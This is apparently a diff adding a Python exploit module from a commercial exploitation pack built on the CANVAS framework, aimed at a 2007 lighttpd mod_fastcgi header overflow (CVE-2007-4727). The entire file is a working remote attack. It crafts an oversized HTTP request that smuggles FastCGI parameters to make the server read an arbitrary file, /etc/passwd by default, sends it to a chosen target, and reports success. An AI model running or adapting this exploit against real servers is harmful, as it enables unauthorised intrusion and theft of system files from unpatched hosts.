@@ -1,0 +1,164 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, time, binascii
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "Lighttpd Mod_FastCGI Remote Header Overflow Exploit"
+VERSION = "0.1"
+DESCRIPTION = "Lighttpd Mod_FastCGI Request Headers Remote Header Overflow Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "<= version 1.4.17"
+DOCUMENTATION["Date public"] = "2007/09/17"
+DOCUMENTATION["CVE Name"] = "CVE-2007-4727"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4727"
+DOCUMENTATION["Note"] = "Tested on Debian Etch with lighttpd 1.4.16 and 1.4.17"
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.port = 80 
+		self.script = "/index.php"
+		self.file = "/etc/passwd"
+		self.name = NAME
+		return
+	
+	def make_request(self):
+		part_one = [0x06, 0x80, 0x00, 0x00, 0x00, 'H', 'T', 'T', 'P', '_', 'W']
+		part_two = [0x01, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
+
+		script_filename = "SCRIPT_FILENAME"
+		size_script_filename = len(script_filename)
+
+		size_file = len(self.file)
+		size_param = 0
+
+		if size_file > 127:
+			size_param += 4
+		else:
+			size_param += 1
+
+		size_param += size_script_filename + size_file
+		param = "%s" % binascii.a2b_hex("%02x" % size_script_filename)
+	
+		if size_file > 127:
+			w = (size_file >> 24) | 0x80
+			param += "%s" % (binascii.a2b_hex("%02x" % int(w)))
+			w = (size_file >> 16) & 0xff;
+			param += "%s" % (binascii.a2b_hex("%02x" % int(w)))
+			w = (size_file >> 8) & 0xff;
+			param += "%s" % (binascii.a2b_hex("%02x" % int(w)))
+			w = size_file & 0xff;
+			param += "%s" % (binascii.a2b_hex("%02x" % int(w)))
+		else:
+			param += "%s" % binascii.a2b_hex("%02x" % int(size_file))
+
+		param += "SCRIPT_FILENAME%s" % self.file
+
+		total = 0x54af - 0x5f - 0x1e3 - size_param - 0x1 - 0x5 - 0x1 - 0x4
+
+		request  = "POST %s HTTP/1.1\r\n" % self.script
+		request += "Host: 192.168.0.9:80\r\n"
+		request += "Connection: close\r\n"
+		request += "Content-Length: %d\r\n" % (total+size_param+len(part_one)+len(part_two)+0x5f)
+		request += "Content-Type: application/x-www-form-urlencoded\r\n"
+		request += "0: vvvv\r\n"
+		request += "%s: %s\r\n" % ("B"*0x6f, "B"*0x74)
+		request += "1: %s\r\n" % ("C"*0x5357)
+		request += "2: %s\r\n" % ("D"*0x57)
+		request += "3: oooo\r\n"
+		request += "%s: %s\r\n" % ("F"*0x68, "F"*0x6d)
+		request += "4: %s\r\n" % ("H"*0x5365)
+		request += "5: %s\r\n" % ("I"*0x57)
+		request += "6: iiii\r\n"
+		request += "%s: %s\r\n" % ("K"*0x62, "K"*0x67)
+		request += "7: %s\r\n" % ("L"*0x5371)
+		request += "8: %s\r\n" % ("M"*0x57)
+		request += "9: uvzz\r\n"
+		request += "%s: %s\r\n" % ("O"*0x5d, "O"*0x62)
+		request += "z: %s\r\n" % ("z"*0xfe)
+		request += "\r\n"
+		request += param
+
+		part_one[3] = (total >> 8) & 0xff;
+		part_one[4] = (total & 0xff) - 1;
+
+		for i in part_one[0:5]:
+			request += binascii.a2b_hex("%02x" % i)
+		for i in part_one[5:10]:
+			request += i
+
+		request += "W"*(total+0x5f)
+
+		for i in part_two:
+			request += binascii.a2b_hex("%02x" % i)
+
+		return request
+
+	def getArgs(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		self.file = self.argsDict.get("file",self.file)
+		self.script = self.argsDict.get("script",self.file)
+		
+	def run(self):
+		self.getArgs()
+
+		request = self.make_request()
+
+		s = self.gettcpsock()
+		try:
+			s.connect((self.host,self.port))
+		except:
+			self.log('Could not connect to port %s:%s'%(self.host,self.port))
+			return 0
+		self.log('Connected to target')
+
+		s.send(request)
+
+		data = ""
+
+		while 1:
+			d = s.recv(1024)
+			if not d:
+				break
+			data += d
+
+		s.close()
+
+		if data.find("HTTP/1.1 200 OK") >= 0:
+			self.log(data)
+			self.setInfo("%s attacking %s:%d - (succeeded!)"%(NAME,self.host,self.port))
+		else:
+			self.setInfo("%s attacking %s:%d - (failed!)"%(NAME,self.host,self.port))
+
+		return 0
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O file:<pathname> -O script:<pathname>"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
